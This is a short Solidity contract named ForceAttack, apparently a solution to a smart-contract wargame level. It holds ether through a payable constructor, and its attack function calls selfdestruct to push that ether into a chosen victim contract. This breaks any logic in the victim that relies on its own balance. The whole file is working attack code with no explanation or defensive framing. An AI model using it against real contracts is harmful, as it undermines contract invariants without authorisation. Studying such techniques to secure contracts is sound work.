// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttack {

    constructor() public payable {
    }

    function attack(address victimContract) public {
        selfdestruct(victimContract);
    }
}